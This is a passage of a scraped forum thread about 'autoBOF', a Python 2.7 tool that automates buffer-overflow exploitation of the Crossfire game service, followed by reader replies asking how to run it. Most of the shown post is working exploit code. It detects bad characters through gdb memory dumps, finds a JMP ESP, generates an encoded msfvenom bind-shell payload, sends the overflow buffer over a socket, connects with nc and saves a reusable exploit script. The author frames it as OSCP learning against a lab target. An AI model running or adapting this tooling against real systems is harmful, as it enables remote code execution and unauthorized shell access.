 newBuffer = start + &quot;BBBB&quot; + section_hex + (&quot;\x41&quot; * (offset-8)) + &quot;CCCC&quot; + (shellSpace * &quot;/x41&quot;) + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open(&quot;/usr/games/crossfire/bin/badchars.txt&quot;, &quot;r&quot;)
 badData = bufFile.read()

 firstEggLocation = badData.find(&quot;0x42424242&quot;) + 11
 lastEggLocation = badData.find(&quot;0x41414141&quot;)
 badData = badData[firstEggLocation:lastEggLocation]

 if(not argSilent):
  print &quot;-----stack------&quot;
  print badData
  print &quot;------------------&quot;

 if(section_text in badData):
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
 else:
  if(not argSilent):
   print &quot;BADCHAR VERIFIED:&quot;, allchars_unsure_text[0]
  badchars_hex.append(allchars_unsure_hex[0])
  badchars_text.append(allchars_unsure_text[0])
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
  continue

if(not argSilent):
 print &quot;Badchar Detection Complete!&quot;
 print &quot;Bad Characters:&quot;, badchars_text
print &quot;Acquiring JMP ESP...&quot;
```

----

This was one of the hardest parts of the program for me to make, as I had no idea whatsoever how to dump and access the relevant memory with gdb. I take a list of every possible ascii character value in hex, and send them in groups of 4 to the service to see if they display properly in memory. If they do, great! If not, one of those 4 characters is a &#39;bad character&#39; and needs to be avoided when I generate my payload. So I add all 4 characters to an array of possible bad characters (since I don&#39;t know which character is the bad one), whenever the expected character sequence fails to appear in memory.

I then do another pass at the service with the allchars_unsure array as my value library, sending each byte in a sequence paired with 3 A&#39;s. Since my program operates under the assumption that A&#39;s are valid characters, I know exactly what to look for. I found this to be a good compromise to approaching this problem, as one bad character can corrupt all of the output after it. I found groups of 4 bytes to be the most convenient to look for and parse with my debugger script, and that&#39;s what I went with. This is probably also where my project falls the farthest from its goal of being an automated buffer overflow generator, since it&#39;s possible a bad character could be invalid but display correctly in memory, and only corrupt the rest of the sequence. In this case, my program would fail to detect 1 out of every 4 such bad characters at a minimum.

----

```python
bufFile = open(&quot;/usr/games/crossfire/bin/jmpSearch.txt&quot;, &quot;r&quot;)
jmpData = bufFile.read()
jmpData = &#39;\n&#39;.join(jmpData.split(&#39;\n&#39;)[1:])

offset1 = jmpData[8:10].decode(&quot;hex&quot;)
offset2 = jmpData[6:8].decode(&quot;hex&quot;)
offset3 = jmpData[4:6].decode(&quot;hex&quot;)
offset4 = jmpData[2:4].decode(&quot;hex&quot;)
eipString = offset1 + offset2 + offset3 + offset4
badlist = &quot;&quot;
while (len(badchars_text) &gt; 0):
 badlist = badlist + badchars_text[0]
 badchars_text.pop(0)

badlist = &quot;\\x&quot; + badlist[0:2] + &quot;\\x&quot; + badlist[2:4] + &quot;\\x&quot; + badlist[4:6] + &quot;\\x&quot; + badlist[6:8]
argPayloadAttempts = int(argPayloadAttempts)
bashCommand = &quot;msfvenom -p linux/x86/shell_bind_tcp LPORT=&quot; + argShellPort + &quot; -f raw -b \&quot;&quot; + badlist + &quot;\&quot; -e x86/shikata_ga_nai -o shellcode.txt&quot;
#Payload JMP Offset Detection Phase
eaxLength = len(start)-2
jmpEAXCommand = &quot;(echo \&quot;add eax, &quot;+ str(eaxLength) + &quot;\&quot;) | exec /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb &gt; eaxHelp.txt 2&gt;/dev/null&quot;
os.system(jmpEAXCommand)
bufFile = open(&quot;eaxHelp.txt&quot;)
eaxValue = bufFile.read()
eaxValue = eaxValue.replace(&quot;nasm&quot;,&quot;&quot;)
eaxValue = eaxValue.replace(&quot; 00000000 &quot;,&quot;&quot;)
eaxValue = eaxValue.replace(&quot;add eax,byte +0xc&quot;,&quot;&quot;)
eaxValue = eaxValue.replace(&quot; &quot;,&quot;&quot;)
eaxValue = eaxValue.replace(&quot;\n&quot;,&quot;&quot;)
eaxValue = eaxValue.replace(&quot;&gt;&quot;,&quot; &quot;)
eaxValue = eaxValue[9:]
eaxLength2 = len(eaxValue)
eaxValue = eaxValue[:eaxLength2-9]
eaxLength2 = len(eaxValue)
retString = &quot;&quot;
control = 0
while(eaxLength2 &gt; 0):
 retString = retString + &quot;\\x&quot; + eaxValue[control:control+2]
 eaxLength2 = eaxLength2-2
 control = control + 2
retString = retString.lower()
oldString = retString
retString = retString.decode(&quot;string_escape&quot;)
```

----

My debugger script has helpfully created a file that contains a valid JMP ESP for us to hijack. So we use that, as well as the other information we&#39;ve gathered so far, in order to create a bash command that will generate a payload. Additionally, since the service I was testing this code against only had 11 bytes of post-offset shellcode space, I decided to have the program assume there will never be enough space after the offset value to insert a payload, and to instead put the payload at the beginning of the buffer, and assume that there will be enough space after the offset to include a JMP instruction to redirect execution to that location. I use another one of Metasploit&#39;s tools for this, albeit very messily.

----

```python
 if(not argSilent):
  print &quot;--- Building Payload ---&quot;
 os.system(bashCommand)
 bufFile = open(&quot;shellcode.txt&quot;, &quot;r&quot;)
 shellcode = bufFile.read()
 newBuffer = start + shellcode + (&quot;\x41&quot; * (offset-len(shellcode))) + eipString + retString + (&quot;\xff\xe0\x90\x90&quot;) + end #the hardcoded values tell the program to jump to the prior variable value
 if(not argSilent):
  print &quot;----------------------&quot;
  print &quot;Deploying Payload...&quot;
 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 if(not argSilent):
  print(&quot;--- Initiating Bind Shell Connection ---&quot;)
 time.sleep(.6)
 output =  os.system(&quot;nc -v &quot;+argLocalIP+&quot; &quot;+argShellPort)
 if(output == 0 or output == 2):
  argPayloadAttempts = 0
  payloadSuccess = True
 else:
  print &quot;Connection Failure!&quot;
  argPayloadAttempts = argPayloadAttempts - 1
if(not payloadSuccess):
 if(not argSilent):
  print &quot;Payload Deployment Failed. Exiting program&quot;
sys.exit()
```
----

This is the (most) fun part! We try to build a payload, deploy it, and catch a shell. We try this a user specified number of times, using the same copy-pasted socket code as always.

----


```python
###Build PayloadFile####
os.system(&quot;mv shellcode.txt &quot; + argExploitName[0:3] +&quot;Shellcode.txt&quot;)
shebang = &quot;#!/usr/bin/python&quot;
load = &quot;import socket, os, time&quot;
output = &quot;output = 256&quot;
outText = &quot;print \&quot;--- Spawning Shell ---\&quot;&quot;
host = &quot;host = \&quot;&quot; + str(argTargetIP) + &quot;\&quot;&quot;
port = &quot;port = &quot; + str(argTargetPort)
fileStart = &quot;start = \&quot;&quot; + argStart.encode(&quot;string_escape&quot;) + &quot;\&quot;&quot;
fileEnd = &quot;end = \&quot;&quot; + argEnd.encode(&quot;string_escape&quot;) + &quot;\&quot;&quot;
valOverwrite = &quot;eipString = \&quot;&quot; + eipString.encode(&quot;string_escape&quot;) + &quot;\&quot;&quot;
jmpEax = &quot;jmpEax = \&quot;&quot; + oldString + &quot;\xff\xe0\x90\x90\&quot;&quot;.encode(&quot;string_escape&quot;)
bufOne = &quot;bufFile = open(\&quot;&quot; + argExploitName[0:3] + &quot;Shellcode.txt&quot; + &quot;\&quot;, \&quot;r\&quot;)&quot;
bufTwo = &quot;shellcode = bufFile.read()&quot;
flow = &quot;flow = \&quot;A\&quot; * &quot; + str(offset-len(shellcode))
code = &quot;buffer = (start + shellcode + flow + eipString + jmpEax + end)&quot;
loopMe = &quot;while(output == 256):&quot;
networking1 = &quot;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)&quot;
networking2 = &quot;s.connect((host, port))&quot;
networking3 = &quot;s.send(buffer)&quot;
networking4 = &quot;os.system(\&quot;nc -v &quot; + str(argTargetIP) + &quot; &quot; + str(argShellPort) + &quot; 2&gt;/dev/null\&quot;)&quot; #TODO change argShellPort to a more logical name, like argShellPort
ductTape = &quot;time.sleep(.6)&quot;
fullExploit = shebang + &quot;\n&quot; + load + &quot;\n&quot; + output + &quot;\n&quot; + host  + &quot;\n&quot; + port  + &quot;\n&quot; + fileStart + &quot;\n&quot; + flow + &quot;\n&quot; + fileEnd + &quot;\n&quot; + valOverwrite + &quot;\n&quot; + jmpEax + &quot;\n&quot; + bufOne + &quot;\n&quot; + bufTwo + &quot;\n&quot; + code  + &quot;\n&quot; + outText + &quot;\n&quot; + loopMe +  &quot;\n &quot; + networking1 + &quot;\n &quot; + networking2 + &quot;\n &quot; + networking3 + &quot;\n &quot; + ductTape + &quot;\n &quot; + networking4 + &quot;\n &quot;
savedExploit = open(argExploitName, &quot;w&quot;)
savedExploit.write(fullExploit)
savedExploit.close()
if(not argSilent):
 print &quot;----------------------&quot;
 print &quot;Exploit saved as &quot; + argExploitName + &quot;, please keep in the same directory as &quot; +  (argExploitName[0:3] + &quot;Shellcode.txt&quot;)
os.system(&quot;rm eaxHelp.txt&quot;)
os.system(&quot;rm offset.txt&quot;)
```

----

We now save a very bad replica of this exploit we just made for later use. The buffer stays in a special file of its own because I couldn&#39;t figure out how to properly write it to a single a file without encoding issues that cause the exploit to fail. Additionally, even though it should theoretically work on the first try (given we&#39;re using the exact same buffer that worked before), it sometimes takes upwards of a minute&#39;s worth of attempts to successfully exploit the service. I have no idea why. Maybe address space layout randomization, even though I thought I disabled that in my environment? Who knows! Also we delete a few temporary files we don&#39;t need anymore and exit.

----

```python
#!gdb
import sys
import gdb
import os
os.system(&quot;echo resetFile &gt; eip.txt&quot;)
number_restarts = 100
gdb.execute(&quot;set pagination off&quot;)
os.system(&quot;/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-bin_tools-0.1.4/bin/msfelfscan -j esp ./crossfire &gt; jmpSearch.txt&quot;)
def on_stop(sig):
  global number_restarts
  if isinstance(sig, gdb.SignalEvent):
    if (number_restarts &gt; 0):
      os.system(&quot;rm eip.txt&quot;)
      gdb.execute(&quot;set confirm off&quot;)
      gdb.execute(&quot;set logging file eip.txt&quot;)
      gdb.execute(&quot;set logging on&quot;)
      gdb.execute(&quot;set logging overwrite on&quot;)
      gdb.execute(&quot;info registers eip&quot;)
      gdb.execute(&quot;set logging off&quot;)
      gdb.execute(&quot;set logging file badchars.txt&quot;)
      gdb.execute(&quot;set logging on&quot;)
      gdb.execute(&quot;x/500xw $esp&quot;)
      gdb.execute(&quot;set logging overwrite off&quot;)
      gdb.execute(&quot;set logging off&quot;)
      gdb.execute(&quot;kill&quot;)
      gdb.execute(&quot;run&quot;)
gdb.events.stop.connect (on_stop)
gdb.execute(&quot;run&quot;)
```

----

Lastly, we have my debugger script. On startup, it wipes anything from past exploit attempts and dumps a list of hijackable ESP&#39;s for the main program to use. Additionally, whenever the program crashes for any reason whatsoever, it dumps the EIP registry and 500 lines of stack memory for usage by my main program.

----

That&#39;s pretty much it. You&#39;re welcome to adapt or use this code for your own purposes, if you think it has any value. I&#39;m reasonably confident I could emulate the restart script with mona and have it work with immunity debugger, and thus be cross platform. In such a case, this tool may be functional (with some work) on the OSCP exam. I&#39;m not sure whether or not it would be allowed though, since then you wouldn&#39;t actually have to know what you&#39;re doing in order to pass that portion of the test. That being said, given my poor programming ability (and the scarcity of these exploits in the wild), it would also be reasonable to assume there isn&#39;t much value to my project outside of it being a wonderful learning experience for me. If anyone has any questions, I will add them to my Q&amp;A, and please feel free to ask whatever comes to mind.

Here&#39;s a screenshot of my program in action: https://i.imgur.com/POnukSS.png

Q&amp;A

----

Q: Why did you write this in Python 2.7?

A: I didn&#39;t actually know I wasn&#39;t using the latest version of python until I had already committed to writing it in 2.7, which was the default version of python on my Linux distro. If Backbox/Kali used 3.0 by default this would have been written in that.

Q: What are those ugly sleep statements for? Why do your scripts communicate by reading and writing to local files?

A: I&#39;m kind of self conscious about this because I&#39;m pretty sure it&#39;s a garbage way to solve this problem, but when I was trying to figure out how to have my scripts interact with each other at all this was the first thing I thought of and it&#39;s what I did.

----</description>
    
    <lastBuildDate>Sun, 02 Jun 2019 19:22:43 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/19">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/19</link>
        <pubDate>Sun, 02 Jun 2019 23:29:32 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-19</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[carbas]]></dc:creator>
        <description><![CDATA[
            <p>Rain what version of Kali32 you was use ? 2019.2 or 2019.1 ?</p>
<p>Big thank you !</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/18">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/18</link>
        <pubDate>Sun, 02 Jun 2019 19:22:43 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-18</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p>Hello again Carbas,</p>
<p>Check that you’re running restart.py first, with the command included in the help function of autoBOF.py. Additionally, the filepath is non-dynamic, so you’ll need to have the crossfire folder in /usr/games/ for it to work, or you can edit the filepath in my program.</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/17">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/17</link>
        <pubDate>Sun, 02 Jun 2019 15:49:30 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-17</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[carbas]]></dc:creator>
        <description><![CDATA[
            <p>Rain hello !</p>
<p>I was try to run autoBOF bat get this error:</p>
<blockquote>
<p>Blockquote— Attempting to Crash Service ----<br>
fuzzing at 4369 bytes out of 4400<br>
Traceback (most recent call last):<br>
File “autoBOF.py”, line 153, in <br>
bufFile = open(“/usr/games/crossfire/bin/eip.txt”, “r”)<br>
IOError: [Errno 2] No such file or directory: ‘/usr/games/crossfire/bin/eip.txt’</p>
</blockquote>
<blockquote>
<p>Blockquote</p>
</blockquote>
<p>How I can fined good version of crossfire and how to remove this error ?</p>
<p>Thank’s for Your help !!!<img src="https://d.clarkee.co.uk/images/emoji/twitter/cry.png?v=15" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/cry.png?v=15" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/cry.png?v=15" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/cry.png?v=15" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/cry.png?v=15" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"><img src="https://d.clarkee.co.uk/images/emoji/twitter/cry.png?v=15" title=":cry:" class="emoji" alt=":cry:" loading="lazy" width="20" height="20"></p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/16">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/16</link>
        <pubDate>Sun, 02 Jun 2019 14:22:02 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-16</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p>Welcome to 0x00Sec, and I’m glad you got something out of my project!</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/15">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/15</link>
        <pubDate>Sun, 02 Jun 2019 00:48:59 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-15</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Hiddenx]]></dc:creator>
        <description><![CDATA[
            <p>This was a gem to read. Thank you. I’m currently in the same boat. Lets just say i’m running through a similar phase where i’m up and going through materials understanding how i can make things work and how they work. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/14">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/14</link>
        <pubDate>Sat, 01 Jun 2019 22:46:11 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-14</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[carbas]]></dc:creator>
        <description><![CDATA[
            <p>Big thank You friend ! Now I understand.  I will try in Kali and Python 2.7 too.</p>
<p>Big thank You !!!</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/13">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/13</link>
        <pubDate>Sat, 01 Jun 2019 21:12:47 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-13</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p>Hey carbas!</p>
<p>All of my code is in this post as well as the github. If you do not want to use the github for some reason, you may pull the code from here. All of the code segments are in chronological order, and compose 2 files. The first of which I call ‘autoBOF.py’ which consists of every code segment except the last one. The last code segment I call ‘restart.py’. The usage instructions are included in the help method, which you can call by running ‘python autoBOF.py -h’. I have only tested this on a 32 bit version of Kali Linux, but theoretically it should work fine on any Linux distribution, so long as you have the following dependencies installed. You will need gdb ( GNU Debugger), as well as the full metasploit framework installed. If you have both of those, it should run fine. I recommend testing it against the Crossfire application hosted by Offensive Security. Oh, and like I mention it is Python 2.7 and not 3.0.</p>
<p>Best of Luck,</p>
<p>Rain</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/12">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/12</link>
        <pubDate>Sat, 01 Jun 2019 20:59:53 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-12</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[carbas]]></dc:creator>
        <description><![CDATA[
            <p>Please explain how to run autoBOF ? I can not understand what files need to be made from this code and what additional modules need to get. <img src="https://0x00sec.org/images/emoji/twitter/sob.png?v=9" title=":sob:" class="emoji" alt=":sob:"></p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/11">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/11</link>
        <pubDate>Sat, 01 Jun 2019 20:46:17 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-11</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[carbas]]></dc:creator>
        <description><![CDATA[
            <p>Thank you very much for your work friend ! Can I ask you to make an archive file with all files of your project and post it on one of fails  hosting(just please not on github) ? I’m just starting and I find it difficult to understand what file to call to turn. Your project is very interesting !!! Thank You !</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/10">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/10</link>
        <pubDate>Sat, 01 Jun 2019 15:36:14 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-10</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
        <description><![CDATA[
            <p>Thank you <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/9">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/9</link>
        <pubDate>Thu, 23 May 2019 23:19:23 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-9</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p>Awesome, feel free to message me if you have any questions when you do! My documentation might be a little lacking, since this is the first tool I’ve made.</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/8">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/8</link>
        <pubDate>Thu, 23 May 2019 20:47:24 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-8</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Mr_RaG3R]]></dc:creator>
        <description><![CDATA[
            <p>This is pretty great man. I’ll definitely be using this in the future.</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/7">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/7</link>
        <pubDate>Thu, 23 May 2019 17:24:45 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-7</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p>Thank you Nick, and welcome to 0x00sec!</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/6">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/6</link>
        <pubDate>Wed, 08 May 2019 13:25:57 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-6</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Nick_Verheijen]]></dc:creator>
        <description><![CDATA[
            <p>Very cool project and write-up. Thanks for sharing!</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/5">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/5</link>
        <pubDate>Wed, 08 May 2019 10:53:26 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-5</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Rain]]></dc:creator>
        <description><![CDATA[
            <p>Woah! Great minds must think alike, eh?</p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/4">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/4</link>
        <pubDate>Mon, 06 May 2019 15:01:13 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-4</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[Jonas]]></dc:creator>
        <description><![CDATA[
            <p>I was once in the same mindset/situation- ended with: <a href="http://web.archive.org/web/20161201075415/http://www.inspectorgadget.dk/wiki/Inspector_Gadget" rel="noopener nofollow ugc">http://web.archive.org/web/20161201075415/http://www.inspectorgadget.dk/wiki/Inspector_Gadget</a></p>
<p>perhaps you can use some ideas from it <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
          <p><a href="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/3">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415/3</link>
        <pubDate>Mon, 06 May 2019 14:55:37 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-13415-3</guid>
        <source url="https://d.clarkee.co.uk/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
      </item>
      <item>
        <title>autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</title>
        <dc:creator><![CDATA[axom_hexor]]></dc:creator>
        <description><![CDATA[
            <p><img src="https://0x00sec.org/images/emoji/twitter/heart_eyes.png?v=9" title=":heart_eyes:" class="emoji" alt=":heart_eyes:"> thanks just joined yesterday asked about automation in Python here there is a tutorial you guys are awesome</p>
